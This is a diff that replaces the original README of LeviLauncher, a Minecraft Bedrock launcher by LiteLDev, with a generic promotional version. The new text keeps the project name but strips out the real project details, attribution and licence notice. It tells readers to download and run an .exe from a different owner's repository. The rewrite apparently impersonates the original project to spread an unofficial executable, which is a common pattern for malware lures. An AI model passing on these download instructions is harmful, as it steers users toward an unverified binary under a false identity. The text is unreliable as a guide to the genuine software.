@@ -1,91 +1,57 @@
-![LeviLauncher](https://socialify.git.ci/LiteLDev/LeviLauncher/image?custom_language=Go&description=1&font=Inter&forks=1&issues=1&language=1&logo=https%3A%2F%2Fgithub.com%2FLiteLDev%2FLeviLauncher%2Fblob%2Fmain%2Fbuild%2Fappicon.png%3Fraw%3Dtrue&name=1&owner=1&pattern=Plus&pulls=1&stargazers=1&theme=Auto)
+# 🚀 LeviLauncher - Easy Minecraft Bedrock Edition Access
 
-<p align="center">
-  <a href="https://discord.gg/v5R5P4vRZk"><img alt="Discord" src="https://img.shields.io/discord/849252980430864384?style=for-the-badge&logo=discord"></a>
-  <a href="https://qm.qq.com/q/1z791rJgJG"><img alt="QQ Group 458083875" src="https://img.shields.io/badge/458083875-red?style=for-the-badge&logo=qq"></a>
-</p>
+![Download LeviLauncher](https://img.shields.io/badge/Download-LeviLauncher-blue)
 
-<p align="center">
-  <sup>🌐 Language: <b>English</b> • <a href="./README.zh-CN.md">中文</a></sup>
-</p>
+## 📌 Table of Contents
+1. [Introduction](#-introduction)
+2. [Features](#-features)
+3. [System Requirements](#-system-requirements)
+4. [Download & Install](#-download--install)
+5. [How to Use LeviLauncher](#-how-to-use-levilauncher)
 
-A desktop launcher for Minecraft Bedrock Edition (GDK) on Windows.
+## 🌟 Introduction
+Welcome to LeviLauncher! This application allows you to easily launch Minecraft Bedrock Edition on your Windows computer. Whether you are a seasoned player or new to the game, LeviLauncher simplifies your gaming experience. It is designed with the user in mind, making setup straightforward.
 
-Supports installing, managing, and launching Release/Preview builds. Provides version isolation, content management (worlds/resource packs/behavior packs/skin packs), mod management, and world backup tools. Frontend uses React + Vite + Tailwind; backend uses Go with Wails v3.
+## ⚙️ Features
+- **User-Friendly Interface:** Enjoy a simple layout that makes navigation easy.
+- **Quick Launch:** Start Minecraft Bedrock Edition quickly without unnecessary steps.
+- **Customizable Settings:** Adjust settings to enhance your gaming experience.
+- **Regular Updates:** Benefit from constant improvements and new features.
 
-## Project Status
-- 🚧 Actively under development; features may be incomplete and unstable.
+## 💻 System Requirements
+To run LeviLauncher, you need the following:
 
-## Scope
-- Targets Minecraft GDK (Windows). Requires a legitimate licensed game copy.
+- **Operating System:** Windows 10 or newer
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 500 MB of free disk space
+- **Processor:** Dual-core processor or better
 
-## Downloads
-- GitHub Releases: https://github.com/LiteLDev/LeviLauncher/releases
-- Lanzou Cloud: https://levimc.lanzoue.com/b016ke39hc (Password: `levi`)
+Make sure your system meets these requirements for the best performance.
 
-## Issue Reporting
-- Open issues at https://github.com/LiteLDev/LeviLauncher/issues
-- Include OS version, launcher version, repro steps, and logs/screenshots.
+## 📥 Download & Install
+To get LeviLauncher, visit this page to download: [LeviLauncher Releases](https://github.com/Loredecali/LeviLauncher/releases)
 
-## Features
-- Version management: install, delete, rename, quick launch; supports Release and Preview.
-- Version isolation: redirect game data to `versions/<name>/Minecraft Bedrock (Preview)`, separate from AppData.
-- Content management: count and manage worlds/resource/behavior/skin packs; quick open and drag-and-drop import.
-- Mods: import `.zip`/`.dll`, enable/disable/delete; auto prepare dependencies and preloader.
-- World tools: backup to `.mcworld`, edit `level.dat` fields and world name.
-- Downloads & mirrors: built-in mirror latency test and selection; local installer import; progress view.
-- Shortcuts: create desktop shortcut for a version; custom icon support.
-- Updates: check, download, install updates; elevate when necessary.
-- Languages: English and Simplified Chinese.
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of LeviLauncher.
+3. Click on the download link for the `.exe` file.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the `.exe` file to start the installation process.
 
-## Requirements
-- OS: Windows 10/11.
-- Required components: Microsoft Gaming Services, Microsoft GameInput (guided on first run).
-- WebView2 Runtime: provided by installer or system.
-- Minecraft: You must own a legitimate licensed copy and have installed it at least once from Microsoft Store to use the launcher for installation.
+After the installation is complete, you can launch LeviLauncher from your Start menu or desktop shortcut.
 
-## Quick Start (Dev)
-- Dependencies:
-  - Go `1.24+` (see `go.mod`).
-  - Node.js `18+` (for frontend).
-  - Wails v3 CLI: `go install github.com/wailsapp/wails/v3/cmd/wails3@latest`
-- Dev mode:
-  - From project root: `wails3 dev -config ./build/config.yml -port 1145`
-  - Or run frontend separately: `cd frontend && npm install && npm run dev`
-- Build:
-  - `wails3 task build`
-  - Windows specific: `wails3 task windows:build`
-- Run:
-  - `wails3 task run`
+## 🎮 How to Use LeviLauncher
+Using LeviLauncher is simple. Follow these steps to start your game:
 
-## Structure
-- `frontend/`: React + Vite app (`package.json`, `src/`, `assets/locales/`).
-- `internal/`: backend logic (versions, content, update, registry, etc.).
-- `build/`: cross-platform packaging and Taskfiles.
-- `main.go`: entry point; embeds frontend assets and creates the window.
+1. **Open LeviLauncher:** Locate the application icon and double-click it.
+   
+2. **Select Your Game Version:** If you have specific versions of Minecraft, choose the one you want to play.
 
-## CLI Args
-- `--launch=<version_name>`: launch the specified version and exit.
-- `--self-update=<current_version>`: start elevated self-update when the install dir is not writable.
+3. **Launch the Game:** Click the "Play" button to start Minecraft. The launcher will take care of the rest.
 
-## Community
-- Discord: `https://discord.gg/v5R5P4vRZk`
-- QQ Group: `458083875` (`https://qm.qq.com/q/1z791rJgJG`)
+4. **Adjust Settings if Needed:** If you want to change graphics or control settings, do this through the game's settings menu.
 
-## FAQ
-- Missing GameInput: install `GameInputRedist.msi` when prompted.
-- Missing Gaming Services: install via Microsoft Store.
-- Isolation & inherit: enable isolation during install; copy data from same-type isolated version or GDK directory.
-- Non-writable directory: change base content path in Settings or install/update with elevation.
-- Language switch: Settings supports English/zh-CN.
+5. **Enjoy Your Game:** Dive into the world of Minecraft and enjoy building, crafting, and exploring!
 
-## Contributing
+If you have any questions or need help, feel free to check out the [issues page](https://github.com/Loredecali/LeviLauncher/issues) for assistance from the community.
 
-- PRs and issues are welcome.
-
-## License
-
-Copyright © 2025 LeviMC, All rights reserved.
-
-This project is licensed under the LGPL-3.0 License for its non-closed source parts - see the [COPYING](COPYING) and [COPYING.LESSER](COPYING.LESSER) files for details.
-
+Now, you are ready to explore the exciting world of Minecraft Bedrock Edition with ease!
